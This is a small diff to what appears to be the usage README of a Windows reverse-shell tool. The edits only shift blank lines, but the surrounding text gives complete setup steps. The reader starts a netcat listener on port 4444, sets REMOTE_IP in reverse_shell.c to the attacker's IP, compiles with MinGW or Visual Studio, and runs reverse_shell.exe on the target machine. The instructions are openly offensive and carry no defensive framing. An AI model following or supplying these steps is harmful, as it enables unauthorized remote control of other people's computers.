@@ -21,6 +21,8 @@ nc -lvnp 4444
 🔹 Replace 4444 with the port number you plan to use.
 
 2. Modify and Compile the Reverse Shell
+
+
 Edit reverse_shell.c and change:
 
 #define REMOTE_IP "192.168.1.100"  // Change to your attacker's IP
@@ -30,9 +32,9 @@ Compile using MinGW (GCC for Windows):
 
 x86_64-w64-mingw32-gcc reverse_shell.c -o reverse_shell.exe -lws2_32
 or using Microsoft Visual Studio:
-
-
 cl reverse_shell.c ws2_32.lib
+
+
 3. Run the Reverse Shell on the Target Machine
 Execute the compiled reverse_shell.exe:
 
